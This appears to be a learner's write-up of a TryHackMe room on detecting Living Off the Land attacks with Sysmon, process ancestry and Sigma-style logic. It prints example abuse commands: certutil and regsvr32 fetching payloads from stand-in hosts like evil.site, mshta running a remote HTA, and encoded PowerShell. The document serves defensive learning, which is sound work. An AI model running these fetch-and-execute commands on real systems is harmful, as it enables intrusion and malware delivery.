# 🛠️ Living Off the Land Attacks — TryHackMe

## 📅 Day 117 - 365 Days of Cybersecurity

## ✅ Status: Completed

---

# 🧠 Overview

In this room, I learned how to detect and analyze **Living Off the Land (LOTL)** attacks, where adversaries abuse legitimate built-in Windows tools to perform malicious actions while evading detection.

Instead of dropping malware, attackers “live off the land” using trusted binaries:

* `certutil.exe`
* `regsvr32.exe`
* `rundll32.exe`
* `mshta.exe`
* `powershell.exe`
* `wmic.exe`
* Sysinternals tools

📌 Key Concept:

Detection focuses on **behavioral abuse of legitimate tools**, not malicious binaries.

---

# 🎯 Learning Objectives

* Understand Living Off the Land attacks
* Identify common LOLBins / LOLBAS abuse
* Detect suspicious use of trusted Windows tools
* Analyze process relationships and command-line abuse
* Apply behavioral detection logic for stealthy attacker tradecraft

---

# 🌾 What is Living Off the Land?

Living Off the Land (LOTL):

Attackers use **native tools already present on the system** instead of custom malware.

Benefits for attackers:

* Blend into legitimate activity
* Evade traditional AV signatures
* Bypass allowlisting
* Reduce forensic artifacts

---

## 🔹 LOLBAS & GTFOBins

Resources introduced:

* LOLBAS (Windows)
* GTFOBins (Linux)

Useful for understanding how trusted binaries can be abused.

---

# ⚔️ Common LOLBins Covered

---

## 🔹 Certutil Abuse

Legitimate use:

* Certificate utility

Attacker abuse:

* Download payloads
* Encode/decode payloads

Example:

```cmd id="js8g21"
certutil -urlcache -split -f http://evil.site/payload.exe payload.exe
```

Detection clues:

* Certutil making network connections
* Unexpected downloads
* Suspicious parent processes

---

## 🔹 Regsvr32 (Squiblydoo)

Abuse example:

```cmd id="ud2mre"
regsvr32 /s /n /u /i:http://evil/payload.sct scrobj.dll
```

Used for:

* Proxy execution
* AppLocker bypass
* Scriptlet execution

MITRE:
T1218 System Binary Proxy Execution

---

## 🔹 Rundll32 Abuse

Example:

```cmd id="wca34n"
rundll32.exe malicious.dll,EntryPoint
```

Can be abused for:

* DLL execution
* Defense evasion
* Payload launching

---

## 🔹 Mshta Abuse

Example:

```cmd id="qf72ol"
mshta http://attacker/payload.hta
```

Used to:

* Execute remote scripts
* Launch payloads
* Fileless execution

---

## 🔹 PowerShell Abuse

Common attacker uses:

* Encoded commands
* Download cradles
* In-memory execution

Example:

```powershell id="q9zl11"
powershell -enc <base64>
```

---

# 🔎 Behavioral Detection Principles

## 📌 Important Lesson

Do not alert because:

❌ `certutil.exe` exists

Alert because:

✅ `certutil.exe` behavior is suspicious

---

## Detection Context Matters

Look for:

* Parent-child anomalies
* Suspicious command-line arguments
* Unexpected network activity
* Unusual execution paths
* User context anomalies

---

## Example Suspicious Process Chain

```text id="c9wh4k"
WINWORD.exe
 └── powershell.exe
      └── certutil.exe
```

➡️ Strong malicious signal

---

# 🧬 Sysinternals Abuse

Tools introduced:

* PsExec
* Autoruns
* Sysinternals utilities

Dual use:

* Admin tools
* Adversary tools

📌 Detection requires context.

---

# 📊 Sysmon Detection Concepts

Important telemetry for detecting LOL abuse:

---

## 🔹 Sysmon Event ID 1

Process Creation

Use for:

* LOLBin command lines
* Parent-child analysis

---

## 🔹 Sysmon Event ID 3

Network Connections

Use for:

* Certutil downloads
* Mshta remote payloads
* C2 connections

---

## 🔹 Sysmon Event ID 11

File Creation

Detect:

* Dropped payloads
* Downloaded binaries

---

## 🔹 Sysmon Event ID 13

Registry Modifications

Detect persistence or proxy execution abuse.

---

# 🧪 Real-World LOL Techniques

Techniques discussed:

* Application whitelisting bypass
* Proxy execution
* Fileless execution
* Defense evasion through trusted tools

MITRE examples:

* T1218 System Binary Proxy Execution
* WMI Event Subscription persistence
* Signed binary abuse

([Medium][1])

---

# 🚨 Indicators of Suspicious LOL Activity

* Certutil downloading external content
* Regsvr32 calling URLs
* Rundll32 executing unknown DLLs
* Encoded PowerShell
* Office spawning admin tools
* LOLBins launched from unusual parents
* Administrative tools used by non-admin users

---

# 🛡️ SOC Detection Approach

## Detection Logic

Focus on:

* Behavior
* Context
* Process ancestry
* Command-line arguments

Not just binary names.

---

## Investigation Workflow

1. Detect suspicious LOLBin execution
2. Review parent-child relationships
3. Analyze command-line arguments
4. Review network/file activity
5. Correlate with persistence or follow-on activity

---

# 🧱 Sigma / Detection Engineering Mindset

Great use case for Sigma-style rules:

Example logic:

Detect:

* `certutil.exe` + URL
* `regsvr32` + remote `.sct`
* `powershell` + `-enc`
* `rundll32` + suspicious DLL path

📌 High-value behavioral detections.

---

# 🛠️ Tools & Concepts Covered

* LOLBAS
* GTFOBins
* Sysinternals
* Sysmon
* Process ancestry analysis
* Sigma detection logic
* MITRE ATT&CK mappings

---

# 🧠 Key Takeaways

* Trusted binaries can be weaponized
* LOL attacks are stealthy because they look legitimate
* Detection depends on behavior and context
* Parent-child process analysis is critical
* Sysmon telemetry is powerful for LOL detection
* This is a strong foundation for threat hunting and detection engineering

---

# 📌 Final Thoughts

This room helped me:

* Understand Living Off the Land tradecraft
* Detect abuse of trusted Windows tools
* Think behaviorally instead of signature-based
* Improve process-tree investigation skills
* Strengthen my SOC detection engineering mindset

